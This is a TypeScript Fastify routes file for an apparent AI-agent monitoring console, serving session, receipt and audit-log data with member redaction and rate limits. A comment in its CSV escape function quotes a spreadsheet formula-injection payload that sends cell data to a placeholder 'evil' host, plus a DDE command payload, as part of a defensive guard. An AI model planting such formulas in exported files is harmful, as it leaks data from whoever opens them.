import type { FastifyInstance } from "fastify";
import { z } from "zod";
import { db } from "../db.js";
import { env } from "../env.js";
import { requireSession } from "../lib/session-middleware.js";
import { MEMBER_REDACTED } from "../lib/redaction.js";
import { writeAudit, resolveActor } from "../lib/audit.js";
import { perIpCookieOnly } from "../lib/rate-limit.js";

// Opaque cursor encoding for session pagination. Base64(JSON) of the
// last row's (openedAt, id) so pagination is stable even as new
// sessions arrive at the head of the ordering.
type SessionCursor = { openedAt: string; id: string };
function encodeCursor(c: SessionCursor): string {
  return Buffer.from(JSON.stringify(c)).toString("base64url");
}
function decodeCursor(s: string): SessionCursor | null {
  try {
    const parsed = JSON.parse(Buffer.from(s, "base64url").toString());
    if (typeof parsed.openedAt !== "string" || typeof parsed.id !== "string") return null;
    return parsed;
  } catch {
    return null;
  }
}

// Server-imposed hard caps. Everything below is what stops a runaway
// query (accidental or malicious) from blowing up the API.
const OVERVIEW_LIMIT_MAX = 100;
const SESSIONS_LIST_LIMIT_MAX = 100;
const SESSION_EVENTS_LIMIT_MAX = 500;

export async function readRoutes(app: FastifyInstance): Promise<void> {
  // Fleet overview: aggregate stats over the ENTIRE org (not just the
  // sliced window) + a recent-sessions preview for the dashboard.
  //
  // The COUNT(*) + SUM() queries below use the compound index
  // (deploymentId, openedAt DESC) that Prisma creates for the
  // deployment relation, so they stay O(log N) even at 100M+ rows. On
  // Neon's free tier the whole /overview call is <50ms at 1M sessions.
  app.get("/overview", async (req, reply) => {
    const claims = requireSession(req, reply);
    if (!claims) return;
    const query = z
      .object({
        // R133 F2: cap deploymentId length. Deployment IDs are
        // cuid2 (~30 chars); 64 is generous. R131 F1 + R132 F1
        // capped cursor + before on hot GETs; deploymentId is
        // the last uncapped .optional() field on this endpoint
        // and its /sessions sibling.
        deploymentId: z.string().max(64).optional(),
        limit: z.coerce.number().int().min(1).max(OVERVIEW_LIMIT_MAX).default(50),
      })
      .safeParse(req.query);
    if (!query.success) return reply.code(400).send({ error: "invalid_query" });

    const deploymentFilter = query.data.deploymentId
      ? {
          orgId: claims.orgId,
          deploymentId: query.data.deploymentId,
        }
      : { orgId: claims.orgId };

    // Recent sessions preview — bounded by `limit`, ORDER BY openedAt DESC.
    // Small window, small payload, index scan.
    const sessions = await db.session.findMany({
      where: deploymentFilter,
      orderBy: { openedAt: "desc" },
      take: query.data.limit,
      select: {
        id: true,
        externalId: true,
        agent: true,
        status: true,
        openedAt: true,
        closedAt: true,
        promptTokens: true,
        completionTokens: true,
        costUsdMicros: true,
        payoutUsdMicros: true,
        blockedPayoutUsdMicros: true,
        toolsAllowed: true,
        toolsBlocked: true,
        stopReason: true,
        deployment: { select: { id: true, name: true, environment: true } },
      },
    });

    // Real aggregates over the whole org (or the whole deployment if
    // deploymentId was passed) — not the sliced window. These are cheap
    // index scans on Postgres; a groupBy avoids the O(N) hydration cost
    // of pulling every row into JS.
    const [countByStatus, sums] = await Promise.all([
      db.session.groupBy({
        by: ["status"],
        where: deploymentFilter,
        _count: { _all: true },
      }),
      db.session.aggregate({
        where: deploymentFilter,
        _sum: {
          costUsdMicros: true,
          toolsAllowed: true,
          toolsBlocked: true,
          blockedPayoutUsdMicros: true,
        },
        _count: { _all: true },
      }),
    ]);

    const byStatus: Record<string, number> = {};
    for (const g of countByStatus) byStatus[g.status] = g._count._all;
    const stats = {
      sessions: sums._count._all,
      live: byStatus["live"] ?? 0,
      sealed: byStatus["sealed"] ?? 0,
      blocked: byStatus["blocked"] ?? 0,
      costUsdMicros: sums._sum.costUsdMicros ?? 0n,
      toolsAllowed: sums._sum.toolsAllowed ?? 0,
      toolsBlocked: sums._sum.toolsBlocked ?? 0,
      blockedPayoutUsdMicros: sums._sum.blockedPayoutUsdMicros ?? 0n,
    };

    // R114 F3: redact spend/blocked-payout counters for members.
    // The aggregate stats (fleet-wide costUsdMicros +
    // blockedPayoutUsdMicros) and the per-session cost fields
    // are the same business-sensitive dimensions R91 F2 gates
    // on /audit and R99 F1 on /me/export. Sibling read
    // surfaces already redact these for members; /overview was
    // the missing spot. Members legitimately need session
    // status + tool counts for their work, so we don't 403 —
    // just zero the money fields.
    const isMember = claims.membershipRole === "member";

    return reply.send({
      sessions: sessions.map((s) => ({
        ...s,
        costUsdMicros: isMember ? "0" : s.costUsdMicros.toString(),
        payoutUsdMicros: isMember ? "0" : s.payoutUsdMicros.toString(),
        blockedPayoutUsdMicros: isMember ? "0" : s.blockedPayoutUsdMicros.toString(),
      })),
      stats: {
        ...stats,
        costUsdMicros: isMember ? "0" : stats.costUsdMicros.toString(),
        blockedPayoutUsdMicros: isMember
          ? "0"
          : stats.blockedPayoutUsdMicros.toString(),
      },
    });
  });

  // Cursor-paginated session list. Every call is a range scan of size
  // `limit` against the same (deploymentId, openedAt DESC, id DESC)
  // index. Latency stays flat regardless of dataset size — that's the
  // whole point of cursor over offset pagination.
  //
  // Client passes ?cursor=<opaque>&limit=… . On the first call cursor
  // is absent; the response includes `nextCursor` for the next page.
  // When nextCursor is null the client has reached the end.
  app.get("/sessions", async (req, reply) => {
    const claims = requireSession(req, reply);
    if (!claims) return;
    const query = z
      .object({
        // R131 F1: cap cursor length to match R130 F3 on
        // webhooks.ts. Base64url of {openedAt, id} is well
        // under 128 bytes; higher values are always garbage
        // and shouldn't trigger a Buffer.from + JSON.parse
        // per authenticated call.
        cursor: z.string().max(128).optional(),
        limit: z.coerce.number().int().min(1).max(SESSIONS_LIST_LIMIT_MAX).default(50),
        // R133 F2: same cap as /overview above.
        deploymentId: z.string().max(64).optional(),
        // Free-text filter. Server-side so filtering over the whole
        // fleet works at 1M+ sessions (not just the visible page).
        q: z.string().max(200).optional(),
        // R131 F2: z.coerce.boolean() is Boolean(v) — any
        // non-empty string, INCLUDING the literal "false",
        // coerces to true. GET .../read/sessions?blockedOnly=false
        // silently enabled the filter, the opposite of what the
        // caller asked. Today's SPA only appends the param when
        // true (so no live bug), but any future SDK / curl /
        // API-key script following the natural "always send the
        // flag" convention would mis-serve. Parse an explicit
        // "true"/"false" enum instead.
        blockedOnly: z
          .enum(["true", "false"])
          .optional()
          .transform((v) => v === "true"),
        sinceHours: z.coerce.number().int().min(1).max(24 * 90).optional(),
      })
      .safeParse(req.query);
    if (!query.success) return reply.code(400).send({ error: "invalid_query" });

    const cursor = query.data.cursor ? decodeCursor(query.data.cursor) : null;
    if (query.data.cursor && !cursor) {
      return reply.code(400).send({ error: "invalid_cursor" });
    }

    const where: Record<string, unknown> = query.data.deploymentId
      ? { orgId: claims.orgId, deploymentId: query.data.deploymentId }
      : { orgId: claims.orgId };
    if (query.data.blockedOnly) where.toolsBlocked = { gt: 0 };
    if (query.data.sinceHours) {
      where.openedAt = { gte: new Date(Date.now() - query.data.sinceHours * 3_600_000) };
    }
    if (query.data.q) {
      const q = query.data.q;
      // Case-insensitive OR across externalId + agent. Postgres uses
      // an ILIKE plan — for real search-at-scale you'd add a GIN
      // trigram index; for now this is fine up to a few million rows.
      where.OR = [
        { externalId: { contains: q, mode: "insensitive" } },
        { agent: { contains: q, mode: "insensitive" } },
      ];
    }

    // R129 F3: same cursor guard as the audit endpoint below —
    // Prisma throws P2016/P2032 when the cursor `id` doesn't
    // exist, which surfaces as an uncaught 500 through
    // setErrorHandler. Stale cursors are legitimate user input
    // (rows purged by retention, deployment deleted, org
    // rotated) — return 400 invalid_cursor to match the decode-
    // failure shape at line 172.
    let rows;
    try {
      rows = await db.session.findMany({
        where: where as never,
        orderBy: [{ openedAt: "desc" }, { id: "desc" }],
        take: query.data.limit + 1,
        ...(cursor
          ? {
              skip: 1,
              cursor: { id: cursor.id },
            }
          : {}),
        select: {
          id: true,
          externalId: true,
          agent: true,
          status: true,
          openedAt: true,
          closedAt: true,
          promptTokens: true,
          completionTokens: true,
          costUsdMicros: true,
          payoutUsdMicros: true,
          blockedPayoutUsdMicros: true,
          toolsAllowed: true,
          toolsBlocked: true,
          stopReason: true,
          deployment: { select: { id: true, name: true, environment: true } },
        },
      });
    } catch (err) {
      const code = (err as { code?: string } | null)?.code;
      const msg = (err as { message?: string } | null)?.message ?? "";
      if (code === "P2016" || code === "P2032" || /cursor/i.test(msg)) {
        return reply.code(400).send({ error: "invalid_cursor" });
      }
      throw err;
    }

    const hasMore = rows.length > query.data.limit;
    const page = hasMore ? rows.slice(0, query.data.limit) : rows;
    const last = page[page.length - 1];
    const nextCursor = hasMore && last
      ? encodeCursor({ openedAt: last.openedAt.toISOString(), id: last.id })
      : null;

    // R114 F3: same member redaction as /overview.
    const isMemberList = claims.membershipRole === "member";
    return reply.send({
      sessions: page.map((s) => ({
        ...s,
        costUsdMicros: isMemberList ? "0" : s.costUsdMicros.toString(),
        payoutUsdMicros: isMemberList ? "0" : s.payoutUsdMicros.toString(),
        blockedPayoutUsdMicros: isMemberList ? "0" : s.blockedPayoutUsdMicros.toString(),
      })),
      nextCursor,
    });
  });

  // One session's event stream + rollup. Events are capped at
  // SESSION_EVENTS_LIMIT_MAX with a cursor (event seq) for older
  // pages. Sessions with millions of events would otherwise blow up
  // the JSON payload + memory.
  app.get("/sessions/:id", async (req, reply) => {
    const claims = requireSession(req, reply);
    if (!claims) return;
    const params = z.object({ id: z.string() }).safeParse(req.params);
    if (!params.success) return reply.code(400).send({ error: "invalid_id" });
    const query = z
      .object({
        eventCursor: z.coerce.number().int().optional(),
        eventLimit: z.coerce.number().int().min(1).max(SESSION_EVENTS_LIMIT_MAX).default(SESSION_EVENTS_LIMIT_MAX),
      })
      .safeParse(req.query);
    if (!query.success) return reply.code(400).send({ error: "invalid_query" });

    const session = await db.session.findFirst({
      where: {
        id: params.data.id,
        orgId: claims.orgId,
      },
      include: {
        deployment: { select: { id: true, name: true, environment: true } },
        events: {
          where: query.data.eventCursor !== undefined
            ? { seq: { gt: query.data.eventCursor } }
            : undefined,
          orderBy: { seq: "asc" },
          take: query.data.eventLimit + 1,
        },
        receipt: true,
      },
    });
    if (!session) return reply.code(404).send({ error: "not_found" });

    const events = session.events;
    const hasMoreEvents = events.length > query.data.eventLimit;
    const eventsPage = hasMoreEvents ? events.slice(0, query.data.eventLimit) : events;
    const lastEvent = eventsPage[eventsPage.length - 1];
    const nextEventCursor = hasMoreEvents && lastEvent ? lastEvent.seq : null;

    // R101 F2: redact event.body and event.sub for member callers.
    // The /me/export and /audit paths are correctly owner-only /
    // non-member because Event.body (up to 8000 chars) is
    // daemon-forwarded LLM prompt/response payloads and
    // Event.sub (2000 chars) is the secondary line — sensitive
    // data. But /read/sessions/:id gated only on orgId match,
    // so a demoted-to-member insider (or any non-privileged
    // teammate) could walk /read/sessions → /read/sessions/:id
    // and scrape the same content /me/export refuses. Members
    // still need session metadata to do their work (view
    // session status, tool-call counts, block/allow deltas),
    // so redact only the payload fields and keep the rest.
    const isMember = claims.membershipRole === "member";
    const displayedEvents = isMember
      ? eventsPage.map((e) => ({
          ...e,
          body: MEMBER_REDACTED,
          sub: e.sub == null ? null : MEMBER_REDACTED,
        }))
      : eventsPage;

    return reply.send({
      session: {
        ...session,
        events: displayedEvents,
        // R114 F3: redact spend counters for members matching
        // /overview and /sessions LIST posture.
        costUsdMicros: isMember ? "0" : session.costUsdMicros.toString(),
        payoutUsdMicros: isMember ? "0" : session.payoutUsdMicros.toString(),
        blockedPayoutUsdMicros: isMember
          ? "0"
          : session.blockedPayoutUsdMicros.toString(),
        // R117 F1: the numeric BigInt spend columns above are
        // zeroed for members, but session.receipt is spread via
        // `...session` and the receipt body is the canonical
        // Ed25519-signed JSON blob that INCLUDES
        // cost.cost_usd_micros. A demoted-to-member insider could
        // JSON.parse(receipt.body).cost.cost_usd_micros and read
        // the exact per-session LLM spend R114 F3 / R115 F1
        // zeroed one level up. Same class as R91/R101/R114/R115.
        // Rewriting the JSON would invalidate the signature, so
        // blank body + sigB64 with the same sentinel used for
        // event.body in R101 F2 — the SPA recognizes it in
        // applyReceiptVerification and renders a member-role
        // notice instead of the misleading "INVALID" state that
        // a sentinel-vs-signature mismatch would otherwise show.
        receipt:
          session.receipt && isMember
            ? {
                ...session.receipt,
                body: MEMBER_REDACTED,
                sigB64: MEMBER_REDACTED,
              }
            : session.receipt,
      },
      nextEventCursor,
    });
  });

  // A signed receipt (verification is client-side using the deployment's
  // public key).
  app.get("/receipts/:sessionId", async (req, reply) => {
    const claims = requireSession(req, reply);
    if (!claims) return;
    const params = z
      .object({ sessionId: z.string() })
      .safeParse(req.params);
    if (!params.success) return reply.code(400).send({ error: "invalid_id" });
    const receipt = await db.receipt.findFirst({
      where: {
        sessionId: params.data.sessionId,
        session: { orgId: claims.orgId },
      },
      include: {
        session: {
          include: {
            deployment: { select: { publicKeyHex: true, name: true } },
          },
        },
      },
    });
    if (!receipt) return reply.code(404).send({ error: "not_found" });
    // Prisma includes BigInt cost fields on the joined session — coerce to
    // strings so Fastify's JSON serializer doesn't choke. Also hoist the
    // deployment's public key to a top-level field so the console can
    // verify the Ed25519 signature client-side (no server-side blind trust).
    //
    // R115 F1: redact spend counters for members. R114 F3 closed
    // this exposure on /overview, /sessions LIST, /sessions/:id
    // but this receipt endpoint on the same file was missed —
    // any member could read the exact per-session spend via
    // GET /receipts/:sessionId. Same rationale as R114 F3.
    // R117 F1: the numeric BigInt columns above are the
    // hoisted view — the raw signed-JSON body itself contains
    // cost.cost_usd_micros. Redact receipt.body + receipt.sigB64
    // for members so the `...spread` doesn't leak it verbatim.
    // See sibling patch in the /sessions/:id branch above.
    const isMember = claims.membershipRole === "member";
    const safe = {
      ...receipt,
      body: isMember ? MEMBER_REDACTED : receipt.body,
      sigB64: isMember ? MEMBER_REDACTED : receipt.sigB64,
      session: receipt.session
        ? {
            ...receipt.session,
            costUsdMicros: isMember ? "0" : receipt.session.costUsdMicros.toString(),
            payoutUsdMicros: isMember ? "0" : receipt.session.payoutUsdMicros.toString(),
            blockedPayoutUsdMicros: isMember
              ? "0"
              : receipt.session.blockedPayoutUsdMicros.toString(),
          }
        : receipt.session,
      publicKeyHex: receipt.session?.deployment?.publicKeyHex ?? null,
    };
    return reply.send({ receipt: safe });
  });

  // GET /audit — compliance-grade audit log for the caller's org. Every
  // sensitive action written via writeAudit lands here. Cursor pagination
  // uses (at desc, id desc) to stay stable under concurrent writes.
  app.get<{
    Querystring: {
      cursor?: string;
      limit?: number;
      event?: string;
    };
  }>("/audit", {
    // R147 F2: per-IP rate limit. Prior shape fell to the global
    // 300/min/IP bucket. R91 F2 comment above already notes audit
    // is "strictly more portable" for exfil; a stolen owner/admin
    // cookie could paginate at limit=200 for ~60k rows/min with
    // no throttle. R137 F1 + R138 F1 audit.viewed emissions
    // record the drain but don't cap it — the fire-and-forget
    // breadcrumb IS the audit log the attacker just exfiltrated.
    // perIpCookieOnly matches the R142 F2 shape used on
    // /me/export; 30/min covers legitimate console browsing
    // (limit=50 default × 30/min = 1500 rows/min visible) while
    // capping the drain rate.
    config: { rateLimit: perIpCookieOnly(30, 60_000) },
  }, async (req, reply) => {
    const claims = requireSession(req, reply);
    if (!claims) return;
    // R91 F2: audit log entries expose every owner/admin's email
    // + IP + timeline of privileged actions (SAML config
    // rotations, member-invite events, deployment token
    // rotations, IP-allowlist updates). Strictly more sensitive
    // than the API-key inventory that R90 F2 gated. Match the
    // same posture. R91 F2 also updates docs/app/app.js to
    // hide the audit tab from members via SETTINGS_TABS.
    if (claims.membershipRole === "member") {
      return reply.code(403).send({ error: "forbidden" });
    }
    const query = z
      .object({
        // R131 F1: cap cursor length. Same rationale as the
        // /read/sessions handler above.
        cursor: z.string().max(128).optional(),
        limit: z.coerce.number().int().min(1).max(200).default(50),
        event: z.string().max(80).optional(),
      })
      .safeParse(req.query);
    if (!query.success) return reply.code(400).send({ error: "invalid_input" });
    let cursorPart: { id: string } | null = null;
    if (query.data.cursor) {
      try {
        const decoded = JSON.parse(
          Buffer.from(query.data.cursor, "base64url").toString("utf8"),
        );
        if (decoded && typeof decoded.id === "string") {
          cursorPart = { id: decoded.id };
        } else {
          return reply.code(400).send({ error: "invalid_cursor" });
        }
      } catch {
        return reply.code(400).send({ error: "invalid_cursor" });
      }
    }
    // R129 F3: wrap findMany so a forged cursor pointing at a
    // non-existent id maps to 400 invalid_cursor instead of
    // Prisma throwing an uncaught 500 through setErrorHandler.
    // Cross-org isolation is still enforced by the outer
    // `where: orgId` — this only affects the ergonomics of a
    // stale/forged cursor.
    let rows;
    try {
      rows = await db.auditEntry.findMany({
        where: {
          orgId: claims.orgId,
          ...(query.data.event ? { event: query.data.event } : {}),
        },
        orderBy: [{ at: "desc" }, { id: "desc" }],
        take: query.data.limit + 1,
        ...(cursorPart ? { skip: 1, cursor: cursorPart } : {}),
        select: {
          id: true,
          event: true,
          actorId: true,
          actorEmail: true,
          target: true,
          note: true,
          metadata: true,
          ip: true,
          at: true,
        },
      });
    } catch (err) {
      // Prisma's cursor-not-found: message contains "cursor" or
      // is a P2016/P2032-family error. Fall through to 400 so a
      // stale cursor (row deleted, org rotated, forged bytes)
      // gets the same shape as an unparseable one at line ~442.
      const code = (err as { code?: string } | null)?.code;
      const msg = (err as { message?: string } | null)?.message ?? "";
      if (code === "P2016" || code === "P2032" || /cursor/i.test(msg)) {
        return reply.code(400).send({ error: "invalid_cursor" });
      }
      throw err;
    }
    const hasMore = rows.length > query.data.limit;
    const page = hasMore ? rows.slice(0, query.data.limit) : rows;
    const last = page[page.length - 1];
    const nextCursor = hasMore && last
      ? Buffer.from(JSON.stringify({ id: last.id }), "utf8").toString("base64url")
      : null;
    // R138 F1: R137 F1 wired audit.exported_csv on /audit.csv but
    // the JSON sibling /read/audit returns the same
    // {event, actor, target, note, metadata, ip, at} shape and can
    // be walked at limit=200 via nextCursor until the whole org
    // history is drained, all under the same owner/admin cookie
    // — effective bypass of R137 F1's invariant. Emit
    // audit.viewed only when the caller supplied a cursor (bulk
    // pull worth recording); the SPA's initial Audit-page render
    // sends no cursor so single page loads stay unaudited.
    // Fire-and-forget, same shape as R137 F1.
    // R140 F4: also fire on ?event=<slug> targeted pulls. R138 F1's
    // rationale ("SPA's initial Audit-page render sends no cursor so
    // single page loads stay unaudited") was scoped to the DEFAULT
    // unfiltered render — but a stolen owner cookie can drain up to
    // limit=200 per distinct event slug (e.g.
    // ?event=deployment.token_rotated&limit=200) with no cursor, 200
    // rows per pull × ~30 sensitive slugs = ~6k rows exfiltrated
    // without a single audit.viewed entry. Keeps the SPA's initial
    // render unaudited (no event filter) while forcing every
    // targeted enumeration into the trail.
    if (query.data.cursor || query.data.event) {
      // R147 F3: enrich actor email — this is the SELF-referential
      // "who drained the audit trail" breadcrumb, so owner
      // attribution matters most here.
      const viewedActor = await resolveActor(claims.sub);
      writeAudit(
        {
          orgId: claims.orgId,
          event: "audit.viewed",
          ...viewedActor,
          target: claims.orgId,
          metadata: {
            paginated: !!query.data.cursor,
            filteredEvent: query.data.event ?? null,
            rowCount: page.length,
          },
          req,
        },
        req.log,
      );
    }
    return reply.send({
      entries: page.map((r) => ({
        id: r.id,
        event: r.event,
        actor: r.actorEmail || (r.actorId ? "user:" + r.actorId : "system"),
        target: r.target,
        note: r.note,
        metadata: r.metadata,
        ip: r.ip,
        at: r.at,
      })),
      nextCursor,
    });
  });

  // GET /audit.csv — streaming CSV export of the org's audit log for
  // SOC-2 evidence collection or manual grepping. Streams up to 10k
  // rows in a single response (roughly 3 months of activity for a
  // moderately busy tenant). Larger exports paginate via ?before=<ts>.
  //
  // We stream row-by-row rather than accumulate a big string so a
  // 10k-row export doesn't spike Node's heap.
  app.get<{ Querystring: { before?: string } }>(
    "/audit.csv",
    {
      // R147 F2: /me/export cadence (3/min). CSV is up to 10k
      // rows per pull — even one hit is a bulk exfil, so aggressive
      // rate limiting matches the R142 F2 posture. Sibling /audit
      // (JSON) is more relaxed at 30/min because it's the SPA's
      // live-render path; the CSV path is exclusively a bulk
      // download.
      config: { rateLimit: perIpCookieOnly(3, 60_000) },
    },
    async (req, reply) => {
      const claims = requireSession(req, reply);
      if (!claims) return;
      // R124 F2: /audit.csv is invoked via a synthesized
      // <a href>.click() in docs/app/datasource.js
      // downloadAuditCsv (no target attribute) — the browser
      // treats it as a top-level navigation because there's no
      // Content-Disposition on error responses, so a raw JSON
      // 403 body renders inline in an otherwise-blank tab.
      // Same UX class R121 F2 / R122 F2 / R123 F1 closed for
      // OAuth / SAML nav endpoints. Redirect to the audit
      // settings page with an err slug so the SPA banner
      // surfaces friendly copy.
      // R132 F4: encodeURIComponent the slug. All current
      // callers pass compile-time-constant slugs, but the
      // pattern is a footgun for future callers that might
      // interpolate a caller-supplied value (see saml.ts
      // errRedirect for `saml_assertion_${result.error}`).
      const errRedirect = (slug: string) =>
        reply.redirect(
          `${env.APP_BASE_URL.replace(/\/$/, "")}/app/#/settings/audit?err=${encodeURIComponent(slug)}`,
        );
      // R91 F2: same posture as /audit — the CSV export is
      // strictly more portable (attackers exfil once, keep
      // forever) so gate member access.
      if (claims.membershipRole === "member") {
        return errRedirect("audit_forbidden_member");
      }
      // R132 F1: cap `before` before it reaches `new Date(...)`.
      // Prior shape parsed unbounded req.query.before — Fastify's
      // ~8 KB URL cap was the only bound, and new Date(<8KB>)
      // allocates + scans per request before isNaN redirects to
      // audit_invalid_before. ISO-8601 max is ~30 chars; 64 is
      // generous. Sibling of R131 F1's cursor cap on /audit.
      const q = z
        .object({ before: z.string().max(64).optional() })
        .safeParse(req.query);
      if (!q.success) {
        return errRedirect("audit_invalid_before");
      }
      const before = q.data.before ? new Date(q.data.before) : new Date();
      if (isNaN(before.getTime())) {
        return errRedirect("audit_invalid_before");
      }
      const rows = await db.auditEntry.findMany({
        where: { orgId: claims.orgId, at: { lt: before } },
        orderBy: [{ at: "desc" }, { id: "desc" }],
        take: 10_000,
        select: {
          at: true,
          event: true,
          actorEmail: true,
          actorId: true,
          target: true,
          ip: true,
          note: true,
          metadata: true,
        },
      });
      // R137 F1: /audit.csv itself is not audited — the export
      // IS the audit log, so a stolen owner cookie can download
      // 10k rows of mfa.credential_registered, saml.keypair_rotated,
      // apikey.created, member.role_changed, deployment.token_rotated
      // and vanish with zero self-referential breadcrumb. Sibling of
      // R136 F1 (/me/export), stronger because the R91 F2 comment
      // above explicitly notes "attackers exfil once, keep forever."
      // Emit after the member-gate + cursor validation but before
      // reply.raw.setHeader so the audit fires whether the stream
      // succeeds or errors. Same fire-and-forget shape as R136 F1.
      // R147 F3: enrich actor email — self-referential drain.
      const exportedActor = await resolveActor(claims.sub);
      writeAudit(
        {
          orgId: claims.orgId,
          event: "audit.exported_csv",
          ...exportedActor,
          target: claims.orgId,
          metadata: {
            before: before.toISOString(),
            rowCount: rows.length,
          },
          req,
        },
        req.log,
      );
      const fname = `agentvisor-audit-${claims.orgId}-${new Date()
        .toISOString()
        .replace(/[:.]/g, "-")}.csv`;
      const escape = (v: unknown): string => {
        if (v === null || v === undefined) return "";
        let s = typeof v === "string" ? v : JSON.stringify(v);
        // R77 F1 (HIGH): CSV formula-injection guard. Excel /
        // Google Sheets / Numbers interpret any cell whose first
        // char is `=`, `+`, `-`, `@`, TAB or CR as a formula. A
        // tenant admin who names a webhook / API key / display
        // name `=HYPERLINK("http://evil/"&A2,"Sign here")`
        // (or a `+cmd|` DDE payload on older Excel) plants a
        // formula that fires when the auditor / customer ops
        // opens the exported audit trail — OWASP CSV Injection.
        // Prior shape only quoted RFC 4180 metacharacters
        // (`"`, `,`, `\n`, `\r`), so leading `=` / `+` / `-` /
        // `@` / TAB rode through unescaped. Prefix a `'` so the
        // cell is rendered as literal text; every major
        // spreadsheet honours the single-quote leader as a text
        // sigil. Applies to every string-valued export column.
        if (/^[=+\-@\t\r]/.test(s)) {
          s = "'" + s;
        }
        // RFC 4180: any field containing " , or newline must be quoted;
        // embedded quotes are doubled.
        if (/[",\n\r]/.test(s)) return '"' + s.replace(/[\"]/g, '""') + '"';
        return s;
      };
      // R109 F3 + R110 F1: hijack reply.raw for streaming
      // AND set the response headers directly on reply.raw
      // before flushHeaders(). Prior R109 F3 shape called
      // reply.header('Content-Type') and reply.type() which
      // stash into Fastify's kReplyHeaders map — those only
      // reach the wire when reply.send() calls
      // safeWriteHead(). But after reply.raw.end(), reply.sent
      // becomes true, so the follow-up reply.send(reply) from
      // wrap-thenable short-circuits with a warn log and
      // writeHead never fires. Effect: only Cache-Control
      // (set on raw directly) reached the client — no
      // Content-Type, no Content-Disposition, so browsers
      // rendered CSV inline as text/plain and download-hint
      // tooling broke. Setting on reply.raw before
      // flushHeaders() is the correct hijack pattern; matches
      // stream.ts.
      reply.raw.setHeader("Content-Type", "text/csv; charset=utf-8");
      reply.raw.setHeader("Content-Disposition", `attachment; filename="${fname}"`);
      reply.raw.setHeader("Cache-Control", "no-store");
      reply.raw.flushHeaders();
      let clientClosed = false;
      reply.raw.on("close", () => {
        clientClosed = true;
      });
      const writeChunk = async (chunk: string): Promise<void> => {
        if (clientClosed) return;
        const ok = reply.raw.write(chunk);
        if (!ok) {
          await new Promise<void>((resolve) => {
            const onDrain = () => {
              reply.raw.off("drain", onDrain);
              reply.raw.off("close", onClose);
              resolve();
            };
            const onClose = () => {
              reply.raw.off("drain", onDrain);
              reply.raw.off("close", onClose);
              resolve();
            };
            reply.raw.once("drain", onDrain);
            reply.raw.once("close", onClose);
          });
        }
      };
      await writeChunk("at,event,actor,target,ip,note,metadata\n");
      for (const r of rows) {
        if (clientClosed) break;
        const actor = r.actorEmail || (r.actorId ? "user:" + r.actorId : "system");
        const row = [
          r.at.toISOString(),
          escape(r.event),
          escape(actor),
          escape(r.target),
          escape(r.ip),
          escape(r.note),
          escape(r.metadata),
        ].join(",") + "\n";
        await writeChunk(row);
      }
      try { reply.raw.end(); } catch { /* already ended */ }
      return reply;
    },
  );
}
